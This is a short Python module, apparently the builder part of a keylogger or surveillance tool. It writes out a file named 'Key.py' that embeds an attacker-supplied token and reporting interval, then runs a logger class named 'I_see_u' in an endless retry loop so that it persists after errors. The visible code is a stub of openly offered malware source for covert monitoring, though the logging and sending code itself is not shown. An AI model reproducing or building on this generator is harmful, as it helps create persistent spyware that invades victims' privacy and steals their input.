# -*- coding: utf-8 -*-
# Author: Abdulrahman Mohammed (De3vil)
# Don't touch my code, it's art 
#+==============================
def build_t(token,time_interval):
	with open("Key.py","w+") as file:
		file.write("from Utils.utils import I_see_u \n")
		file.write("from time import sleep\n")
		file.write(f"""
def run():
	while 1:
		try:
			Log = I_see_u('{token}',{time_interval})
			""")
		file.write("Log.Run()")
		file.write("""
		except Exception:
			sleep(120)
			""")
		file.write(""" 
run()
	""")
		file.close()